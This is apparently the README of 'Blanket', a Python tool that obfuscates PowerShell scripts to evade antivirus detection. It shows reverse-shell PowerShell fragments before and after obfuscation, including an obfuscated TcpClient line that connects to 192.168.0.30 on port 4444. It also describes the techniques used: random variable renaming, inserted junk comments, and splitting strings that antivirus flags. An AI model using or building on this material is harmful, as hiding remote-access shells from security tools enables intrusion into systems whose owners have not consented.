# Blanket

````
▀█████████▄   ▄█          ▄████████ ███▄▄▄▄      ▄█   ▄█▄    ▄████████     ███     
  ███    ███ ███         ███    ███ ███▀▀▀██▄   ███ ▄███▀   ███    ███ ▀█████████▄ 
  ███    ███ ███         ███    ███ ███   ███   ███▐██▀     ███    █▀     ▀███▀▀██ 
 ▄███▄▄▄██▀  ███         ███    ███ ███   ███  ▄█████▀     ▄███▄▄▄         ███   ▀ 
▀▀███▀▀▀██▄  ███       ▀███████████ ███   ███ ▀▀█████▄    ▀▀███▀▀▀         ███     
  ███    ██▄ ███         ███    ███ ███   ███   ███▐██▄     ███    █▄      ███     
  ███    ███ ███▌    ▄   ███    ███ ███   ███   ███ ▀███▄   ███    ███     ███     
▄█████████▀  █████▄▄██   ███    █▀   ▀█   █▀    ███   ▀█▀   ██████████    ▄████▀   
             ▀                                  ▀                                  
````

If you are worried about being found perhaps try taking cover under a blanket.

Pure Python PowerShell Obfuscator 
****
##Usage

`git clone https://github.com/warren2i/Blanket`

`cd Blanket`



`usage: Blanket.py [-h] -i IP -p PORT [-o OUTFILE] [-s SCRIPT] [-v VARSIZE]
`
****
##FROM THIS

![alt text](https://github.com/warren2i/Blanket/blob/master/screenshots/virustotalflag.png?raw=true)
```
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");

```

##TO THIS

![alt text](https://github.com/warren2i/Blanket/blob/master/screenshots/virustotalencoded.png?raw=true)
```
<# Rick  HOLY CRAP  MORTY RUN     they take off  running in complete and total fear as the monster chases them   #>
$qiWhuJGxwI = new-object $jIXFgQanbD$ARXnYkEGqw$wSZMLtSCNA$hWVEIzFKHR$lDnUhrDSGw$aRBYRkGFUw$kXBLnxbVkq('192.168.0.30', 4444);
<# Jerry  Well  now you can build baskets and watch Paul Newman movies on VHS and mentally scar the Boy Scouts every Christmas   #>
if($qiWhuJGxwI -eq $rAQVEYeUkX){exit 1}
<# Jessica  You re Morty  right   #>
$GMRilHjFFt = $qiWhuJGxwI.GetStream();
<# Announcer  The glarp zone is for flarping and unglarping only   #>
$wdosspwpUlDUCxjSMOa = new-object $jFOPXASzCc$SPJkhQzvSx$HBxMZKRsex$NQbpEvtWIi$WBpIsOyusc($GMRilHjFFt);
<# Rick  Morty  I had to    I had to do it  I had�   I had to�   I had to make a bomb  Morty  I had to create a bomb   #>
$mpExOgyAGZ = new-object $ccPCTjvCMR$QGNWUyjRyA$GZSdvCoHYt[] 1024;
<# Morty  Ohhhhh   Rick pushes over a giant capsule  with an alien fetus over  smashing some Gromflomites  to slow them down   #>
$CABnIxyBoA = new-object $GUxCXYklTR$jmgKZRfvsC$dbYEHnzBop$PCZxvNmpro$esduLAahPr$vVAAgyplvP$xNZyQeUbTR;
<# Principal Vagina  I done been notifying you  Have you not been getting the messages I ve been leaving with Morty s grandfather   #>
```

##How Does Blanket Work?

####randomvar(length)

Creates a random string of length (length), this is used to replace variables

####addcomments()

Insert a comment on each line, comments are generated from text file defined with argument -c --comments

####breakdatatype(string, rando)

Locates strings found by av and breaks into random multi line variables

#####Before Blanket
```
$pinfo = New-Object System.Diagnostics.ProcessStartInfo
```
#####After Blanket
```
$WjUHPtSUMs = New-Object $FxWBgCj$qzCeaqa$qjGBOBx$KRKWjyD$CRLlqAV$PspQekI$XkPguzs$FcQZxty$LXMGRypStartInfo 